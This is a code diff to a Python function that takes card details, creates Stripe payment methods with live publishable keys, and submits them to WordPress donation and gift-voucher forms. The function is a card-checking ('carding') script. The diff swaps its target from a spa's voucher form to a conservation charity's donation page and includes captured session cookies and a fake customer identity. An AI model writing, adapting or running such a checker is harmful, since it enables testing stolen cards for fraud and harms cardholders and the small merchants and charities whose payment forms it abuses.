@@ -26,33 +26,30 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_0ssuuGVx1XpDr4BLpavlETM000NqVFG8Jt'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    'cookielawinfo-checkbox-necessary': 'yes',
-	    'cookielawinfo-checkbox-functional': 'yes',
-	    'cookielawinfo-checkbox-performance': 'yes',
-	    'cookielawinfo-checkbox-analytics': 'yes',
-	    'cookielawinfo-checkbox-advertisement': 'yes',
-	    'cookielawinfo-checkbox-others': 'yes',
-	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=',
-	    'viewed_cookie_policy': 'yes',
-	    '__stripe_mid': '1e06d305-c005-4320-825f-3d7235182dd94b3fce',
-	    '__stripe_sid': '157c4e92-1ebd-4e68-991f-f5e30eaf3da1904f64',
+	    '_gcl_au': '1.1.384640925.1744449051',
+	    '_ga': 'GA1.1.1085755529.1744449051',
+	    '_hjSessionUser_3497835': 'eyJpZCI6IjA4MWI3OGQ4LWYzOTUtNWJmNS04MGNkLTAxZjQ3MGNmNjRkNSIsImNyZWF0ZWQiOjE3NDQ0NDkwNTA5MjEsImV4aXN0aW5nIjp0cnVlfQ==',
+	    '_hjSession_3497835': 'eyJpZCI6IjZiNDA1YzJmLWU5NGMtNGU5OC05ODgyLTc5MDEzZTViMjIzNiIsImMiOjE3NDQ0NDkwNTA5MjQsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
+	    '__stripe_mid': 'd04d4ecd-e762-4ffa-968b-d14cfed8f4d09db45e',
+	    '__stripe_sid': '5be0da16-762b-47eb-8960-8f2695e1529b25fcb4',
+	    '_ga_CDD0PCVREP': 'GS1.1.1744449050.1.1.1744449063.0.0.0',
 	}
 	
 	headers = {
-	    'authority': 'ornamentspa.eu',
+	    'authority': 'wfc.frclab.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=yes; cookielawinfo-checkbox-performance=yes; cookielawinfo-checkbox-analytics=yes; cookielawinfo-checkbox-advertisement=yes; cookielawinfo-checkbox-others=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsImZ1bmN0aW9uYWwiOnRydWUsInBlcmZvcm1hbmNlIjp0cnVlLCJhbmFseXRpY3MiOnRydWUsImFkdmVydGlzZW1lbnQiOnRydWUsIm90aGVycyI6dHJ1ZX0=; viewed_cookie_policy=yes; __stripe_mid=1e06d305-c005-4320-825f-3d7235182dd94b3fce; __stripe_sid=157c4e92-1ebd-4e68-991f-f5e30eaf3da1904f64',
-	    'origin': 'https://ornamentspa.eu',
-	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
+	    # 'cookie': '_gcl_au=1.1.384640925.1744449051; _ga=GA1.1.1085755529.1744449051; _hjSessionUser_3497835=eyJpZCI6IjA4MWI3OGQ4LWYzOTUtNWJmNS04MGNkLTAxZjQ3MGNmNjRkNSIsImNyZWF0ZWQiOjE3NDQ0NDkwNTA5MjEsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3497835=eyJpZCI6IjZiNDA1YzJmLWU5NGMtNGU5OC05ODgyLTc5MDEzZTViMjIzNiIsImMiOjE3NDQ0NDkwNTA5MjQsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; __stripe_mid=d04d4ecd-e762-4ffa-968b-d14cfed8f4d09db45e; __stripe_sid=5be0da16-762b-47eb-8960-8f2695e1529b25fcb4; _ga_CDD0PCVREP=GS1.1.1744449050.1.1.1744449063.0.0.0',
+	    'origin': 'https://wfc.frclab.com',
+	    'referer': 'https://wfc.frclab.com/donate-now/',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -63,18 +60,8 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	params = {
-	    't': '1744427580057',
-	}
+	data = "action=wpf_submit_form&form_id=9982&payment_total=100&form_data=__wpf_form_id%3D9982%26__wpf_current_url%3Dhttps%253A%252F%252Fwfc.frclab.com%252Fdonate-now%26__wpf_current_page_id%3D6691%26donation_item_custom%3D1%26donation_item%3Dcustom%26donation_recurring_interval%3Dmonth%26customer_name%3DRodam%2520User%26customer_email%3Drodamuser08%2540gmail.com%26select%3DUnrestricted%2520-%2520Give%2520where%2520it's%2520needed%2520most%26__wpf_valid_payment_methods_count%3D2%26__wpf_selected_payment_method%3Dstripe%26__paypal_payment_gateway%3Dpaypal%26__stripe_payment_method_id%3D"+str(pm)+"&tax_total=0&main_total=100&form_localize%5Bform_id%5D=9982&form_localize%5Bcheckout_description%5D=Donation+template+(horizontal)+(%239982)&form_localize%5Bcurrency_settings%5D%5Bcurrency%5D=USD&form_localize%5Bcurrency_settings%5D%5Blocale%5D=auto&form_localize%5Bcurrency_settings%5D%5Bcurrency_sign_position%5D=left&form_localize%5Bcurrency_settings%5D%5Bcurrency_separator%5D=dot_comma&form_localize%5Bcurrency_settings%5D%5Bdecimal_points%5D=0&form_localize%5Bcurrency_settings%5D%5Bsettings_type%5D=global&form_localize%5Bcurrency_settings%5D%5Bcurrency_conversion_api_key%5D=&form_localize%5Bcurrency_settings%5D%5Bcurrency_rate_caching_interval%5D=&form_localize%5Bcurrency_settings%5D%5Bis_zero_decimal%5D=false&form_localize%5Bcurrency_settings%5D%5Bcurrency_sign%5D=%24&form_localize%5Bstripe_checkout_title%5D=Women+for+Conservation&form_localize%5Bstripe_checkout_logo%5D=&form_localize%5Bstripe_pub_key%5D=pk_live_0ssuuGVx1XpDr4BLpavlETM000NqVFG8Jt&form_localize%5Bstripe_checkout_style%5D=embedded_form&form_localize%5Bstripe_verify_zip%5D=no&form_localize%5Bstripe_billing_info%5D=no&form_localize%5Bstripe_shipping_info%5D=&form_localize%5Bstripe_element_id%5D=wpf_input_9982_stripe_card_element&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bdonation_item%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_name%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bcustomer_email%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bselect%5D%5Boptions%5D%5B0%5D%5Bvalue%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Bconditional_logic%5D=no&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Bconditional_type%5D=any&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Btarget_field%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Bcondition%5D=&form_localize%5Bconditional_logic%5D%5Bchoose_payment_method%5D%5Boptions%5D%5B0%5D%5Bvalue%5D="
 	
-	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3De4edf751cf%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D0817480671%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D'+str(pm)+'&action=fluentform_submit&form_id=5'
-	
-	r2 = requests.post(
-	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
-	    params=params,
-	    cookies=cookies,
-	    headers=headers,
-	    data=data,
-	)
+	r2 = requests.post('https://wfc.frclab.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
